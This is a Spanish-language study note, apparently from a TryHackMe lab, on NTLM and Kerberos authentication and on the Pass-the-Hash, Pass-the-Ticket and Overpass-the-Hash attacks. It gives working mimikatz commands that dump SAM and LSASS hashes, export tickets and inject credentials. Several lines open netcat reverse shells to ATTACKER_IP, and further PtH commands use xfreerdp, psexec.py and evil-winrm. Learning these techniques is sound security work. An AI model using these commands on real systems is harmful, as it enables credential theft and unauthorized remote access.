---
layout: apunte
title: "4. Use of Alternate Authentication Material"
---

Por material alternativo de autentificación nos referimos a cualquier pieza de información que pueda ser usado para acceder a una cuanta de Windows sin realmente conocer la contraseña. Esto es posible debido a cómo algunos protocolos de autentificación usados por las redes Windows funcionan. En esta tarea, estaremos viendo un par de alternativas disponibles para iniciar sesión como un usuario cuando cualquiera de los siguientes protocolos de autentificación está disponible en la red:

- Autentificación NTLM
- Autentificación Kerberos

---------------------------------
<h2>Autentificación NTLM</h2>
Antes de adentrarnos en las técnicas de movimiento lateral, vamos a echar un vistazo a cómo la autentificación NTLM funciona:

!**Pasted image 20260908194444.png**

1. El cliente manda una petición de autentificación al servidor que quiere acceder.
2. El servidor genera un número random y lo manda como reto al cliente.
3. El cliente combina su hash de contraseña NTLM con el reto (y otra información conocida) para generar una respuesta al reto y lo manda de vuelta al servidor para la verificación.
4. El servidor redirige tanto el reto como la respuesta al controlador del dominio para verificación.
5. El controlador de dominio usa el reto para recalcular la respuesta y la compara a la respuesta inicial mandado por el cliente. Si ambos coinciden, el cliente es autentificado; de no ser así, se deniega el acceso. El resultado de la autentificación es mandado de vuelta al servidor.
6. El servidor redirije el resultado de la autentificación al cliente.

-------------------------------
<h2>Pass-the-Hash</h2>
Como resultado de extraer credenciales de un host donde hemos obtenido privilegios administrativos, puede que tengamos contraseñas en texto plano o hashes que pueden ser crackeados fácilmente. Sin embargo, si no tenemos suerte, terminaremos con hashes NTLM no crackeados.

Aunque puede parecer que no podemos utilizar dichos hashes, el reto NTLM mandado durante la autentificación puede ser respondido sabiendo únicamente el hash de la contraseña. En lugar de tener que crackear el hash NTLM, si el dominio de Windows está configurado para usar autentificación NTLM, podemos pasar el hash (PtH) y autentificarnos exitosamente.

Para extraer hashes NTLM, podemos o usar mimikatz para leer el SAM local o extraer hashes directamente de la memoria LSASS.

<h3>Extraer Hashes NTLM de la SAM Local</h3>
Este método permitirá sólo obtener hashes de los usuarios locales de la máquina. No habrá disponibles hashes de usuarios de dominio:

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

<h3>Extraer Hashes NTLM de la Memoria LSASS</h3>
Este método te permitirá extraer cualquier hash NTLM de usuarios locales y cualquier usuario de dominio que haya iniciado sesión recientemente en la máquina.

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484     
```

Podemos usar los hashes extraídos para realizar un ataque PtH usando mimikatz para inyectar un token de acceso para la víctima en una reverse shell de la siguiente manera:

```powershell
mimikatz$ token::revert
mimikatz$ sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Fíjate que hemos usado `token::revert` para restablecer nuestros privilegios de token originales, ya que intentar pasar el hash con un token elevado no funcionará.

Esto sería equivalente a usar `runas /netonly` pero con un hash en lugar de una contraseña y spawneará una nueva reverse shell desde donde podemos lanzar cualquier comando como el usuario víctima.

Para recibir una reverse shell debemos ponernos en escucha:

```bash
user@Attackbox$ nc -lvp 5555
```

>[!IMPORTANT] Si ejecutas el comando `whoami` en esta shell, te mostrará el usuario que eras antes de realizar el PtH, pero cualquier comando que ejecutes desde aquí usará las credenciaes inyectadas.

<h3>Pasar el Hash usando Linux</h3>
Si tienes acceso a una máquina Linux, varias herramientas tienen soporte para realizar un PtH usando protocolos diferentes. Dependiendo de qué servicios estén disponibles para ti, puedes hacer lo siguiente:

<h4>Conectarse a RDP usando PtH</h4>
```bash
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

<h4>Conectarse vía psexec usando PtH</h4>
```bash
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

<h4>Conectarse a WinRM usando PtH</h4>
```bash
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

----------------------------------
<h2>Autentificación de Kerberos</h2>
Vamos a echar un vistazo rápido a cómo la autentificación de Kerberos funciona en las redes Windows:

1. El usuario manda su nombre de usuario y un timestamp encriptado usando la clave derivada de su contraseña a la **Key Distribution Center (KDC)**, un servicio normalmente instalado en el controlador de dominio a cargo de crear tickets de Kerberos en la red.
   
   El KDC creará y mandará de vuelta un **Ticket Granting Ticket (TGT)**, permitiendo al usuario pedir tickets para acceder a servicios específicos sin pasar sus credenciales a los servicios en sí mismos. Junto con el TGT, una **Session Key** es dada al usuario, la cual necesitarán para generar la petición que le sigue.
   
   El TGT es encriptado usando el hash de la contraseña de la cuenta **krbtgt** por lo que el usuario no puede acceder a sus contenidos. Es importante saber que el TGT encriptado incluye una copia de la Session Key como parte de su contenido, y el KDC no necesita almacenar la Session Key ya que la puede recuperar desencriptando el TGT si lo necesita.
   
   !**Pasted image 20260909105527.png**
2. Cuando los usuarios quieren conectarse a un servicio en la red como una compartición, sitio web o base de datos, usarán su TGT para pedirle un **Ticket Granting Service (TGS)** al KDC. Los TGSs son tickets que permiten la conexión sólo a los servicios específicos para los que fueron creados. Para pedir un TGS, el usuario mandará su nombre de usuario y timestamp encriptado usando la Session Key, junto con el TGT y un **Service Principal Name (SPN)**, el cual indica el nombre de servicio y servidor al cual intenta acceder.
   
   Como resultado, el KDC nos mandará un TGS y una **Service Session Key**, la cual necesitaremos mandar para autentificarnos ante el servicio al que queremos acceder. El TGS contiene una copia de la Service Session Key en sus contenidos encriptados para que el Service Owner pueda acceder a ellos desencriptando el TGS.
   
   !**Pasted image 20260909131037.png**
3. El TGS puede ser mandado al servicio deseado para autentificar y establecer conexión. El servicio usará el hash de la contraseña de su cuenta configurada para desencriptar el TGS y validar la Service Session Key.
   
   !**Pasted image 20260909131215.png**

----------------------------------------
<h2>Pass-the-Ticket</h2>
A veces será posible extraer los tickets y claves de sesión de Kerberos de la memoria LSASS usando mimikatz. El proceso requiere que tengamos privilegios SYSTEM en la máquina atacada y se hace de la siguiente manera:

```powershell
mimikatz$ privilege::debug
mimikatz$ sekurlsa::tickets /export
```

>[!IMPORTANT] Ten en cuenta que si sólo tuviste acceso a un ticket pero no a su correspondiente con la clave de sesión, no podrás utilizar ese ticket, por lo que ambos son necesarios.

Aunque mimikatz puede extraer cualquier TGT o TGS disponible en la memoria LSASS, la mayoría del tiempo estaremos interesados en los TGTs ya que pueden ser usados para pedir acceso a cualquier servicio al que el usuario tenga permitido acceder. Al mismo tiempo, los TGSs sirven sólo para un servicio específico. Extraer los TGTs puede requerir tener credenciales administrativas, y extraer los TGSs puede ser hecho con una cuenta con bajos privilegios.

Una vez extraído el ticket deseado, podemos inyectarlo en la sesión actual con el siguiente comando:

```powershell
mimikatz$ kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Inyectar tickets en nuestra propia sesión no requiere permisos administrativos. Después de esto, los tickets estarán disponibles para cualquier herramienta que usemos para movimiento lateral. Para comprobar si los tickets fueron inyectados correctamente, puedes usar el comando `klist`:

```powershell
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

-----------------------------------
<h2>Overpass-the-Hash / Pass-the-Key</h2>
Este tipo de ataque es similar a PtH pero aplicado a las redes Kerberos.

Cuando un usuario pide un TGT, manda un timestamp encriptado con una clave de encriptación derivada de su contraseña. El algoritmo usado para derivarla puede ser DES (deshabilitado por defecto en las versiones actuales de Windows), RC4, AES128 o AES256, dependiendo de la versión de Windows instalada y la configuración de Kerberos. Si tenemos cualquiera de estas claves, podemos pedirle al KDC un TGT sin requerir la contraseña en sí, de ahí el nombre **Pass-the-Key (PtK)**.

Podemos obtener las claves de encriptación de Kerberos desde la memoria usando mimikatz con los siguientes comandos:

```powershell
mimikatz$ privilege::debug
mimikatz$ sekurlsa:ekeys
```

Dependiendo de las claves disponibles, podemos ejecutar los siguientes comandos en mimikatz para obtener una reverse shell vía Pass-the-Key:

**Si tenemos el hash RC4:**

```powershell
mimikatz$ sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**Si tenemos el hash AES128:** 

```powershell
mimikatz$ sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**Si tenemos el hash AES256:**

```powershell
mimikatz$ sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

>[!IMPORTANT] Ten en cuenta que al usar RC4, la clave será igual que el hash NTLM del usuario. Esto significa que si podemos extraer el hash NTLM, podemos usarlo para pedir un TGT mientras RC4 sea una de las opciones disponibles. Esta variante particular es conocida como **Overpass-the-Hash (OPtH)**.

